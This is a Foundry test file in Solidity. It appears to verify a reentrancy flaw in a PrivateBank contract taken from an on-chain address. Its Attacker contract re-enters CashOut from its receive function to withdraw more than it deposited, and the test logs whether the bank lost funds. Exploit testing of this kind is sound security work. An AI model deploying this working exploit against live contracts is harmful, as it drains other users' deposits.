// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol";

contract ReentrancyTest is Test {
    Log private logger;
    PrivateBank private bank;
    Attacker private attacker;

    address private constant LEGIT_USER = address(0x123);
    uint256 private constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        // Deploy contracts
        logger = new Log();
        bank = new PrivateBank(address(logger));
        
        // Deploy attacker contract
        attacker = new Attacker(payable(address(bank)));

        // Legitimate user deposits funds
        vm.deal(LEGIT_USER, DEPOSIT_AMOUNT);
        vm.prank(LEGIT_USER);
        bank.Deposit{value: DEPOSIT_AMOUNT}();

        // Attacker deposits funds
        vm.deal(address(attacker), DEPOSIT_AMOUNT);
        attacker.deposit{value: DEPOSIT_AMOUNT}();
    }

    function testReentrancyAttack() public {
        console.log("--- BEFORE-Trigger Attack ---");
        // Capture pre-attack states
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBankBalanceBefore = bank.balances(address(attacker));
        uint256 legitUserBankBalanceBefore = bank.balances(LEGIT_USER);
        
        console.log("Initial bank ETH balance:", bankBalanceBefore);
        console.log("Attacker bank deposit balance:", attackerBankBalanceBefore);
        console.log("Legit user bank deposit balance:", legitUserBankBalanceBefore);
        
        console.log("--- Trigger Attack ---");
        // Execute reentrancy attack
        attacker.attack(DEPOSIT_AMOUNT);
        
        console.log("--- AFTER-Trigger Attack ---");
        // Capture post-attack states
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBankBalanceAfter = bank.balances(address(attacker));
        uint256 legitUserBankBalanceAfter = bank.balances(LEGIT_USER);
        
        console.log("Post-attack bank ETH balance:", bankBalanceAfter);
        console.log("Attacker bank deposit balance (post):", attackerBankBalanceAfter);
        console.log("Legit user bank deposit balance (post):", legitUserBankBalanceAfter);
        
        // Verify vulnerability criteria
        bool bankLostFunds = (bankBalanceAfter < bankBalanceBefore);
        bool attackChangedAttackerBalance = (attackerBankBalanceBefore != attackerBankBalanceAfter);
        bool legitUserUnchanged = (legitUserBankBalanceAfter == legitUserBankBalanceBefore);
        
        console.log("Bank lost funds? %s  (Diff: %d ETH)", bankLostFunds ? "YES" : "NO", (bankBalanceBefore - bankBalanceAfter)/1e18);
        console.log("Attacker deposit balance changed? %s  (Before: %d ETH, After: %d ETH)",
            attackChangedAttackerBalance ? "YES" : "NO",
            attackerBankBalanceBefore/1e18,
            attackerBankBalanceAfter/1e18);
        console.log("Legit user deposit unchanged? %s", legitUserUnchanged ? "YES" : "NO");
        
        // Final vulnerability determination
        if (bankLostFunds && legitUserUnchanged) {
            console.log("Vulnerability Exists: Reentrancy allowed attacker to drain funds while preserving legit user appearance");
        } else {
            console.log("Vulnerability not Exist: No improper fund drainage detected");
        }
    }
}

contract Attacker {
    PrivateBank private bank;
    uint256 private amountToSteal;
    uint256 private reentrancyCounter;

    constructor(address payable _bank) {
        bank = PrivateBank(_bank);
    }

    function deposit() external payable {
        bank.Deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        amountToSteal = amount;
        reentrancyCounter = 0;
        bank.CashOut(amount);
    }

    receive() external payable {
        if (reentrancyCounter == 0 && address(bank).balance >= amountToSteal) {
            reentrancyCounter++;
            bank.CashOut(amountToSteal);
        }
    }
}